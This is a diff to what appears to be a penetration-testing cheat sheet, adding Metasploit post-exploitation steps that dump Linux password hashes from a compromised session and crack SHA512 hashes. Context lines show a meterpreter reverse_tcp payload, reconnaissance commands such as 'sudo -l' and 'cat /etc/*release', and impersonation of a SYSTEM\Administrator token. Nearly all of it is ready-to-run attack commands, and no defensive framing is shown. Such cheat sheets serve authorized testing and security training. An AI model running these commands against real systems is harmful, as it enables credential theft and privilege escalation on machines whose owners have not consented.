@@ -760,6 +760,22 @@ set payload windows/meterpreter/reverse_tcp
 `whoami` && `id` && `sudo -l` && `cat /etc/*release` && `uname -a`
 
 
+Few more Post Exploitation tricks:
+
+```
+use post/linux/gather/hashdump
+set SESSION 1
+exploit
+```
+
+```
+use auxiliary/analyze/crack_linux
+set SHA512 true
+run
+```
+
+
+
 ## 4. Privilege Escalation
 
 
@@ -782,6 +798,7 @@ Loading extension incognito...Success.
 meterpreter > list_tokens -u
 meterpreter > impersonate_token "SYSTEM\Administrator"
 ```
+
 
 
 ### 4.2 PrivEsc on Linux
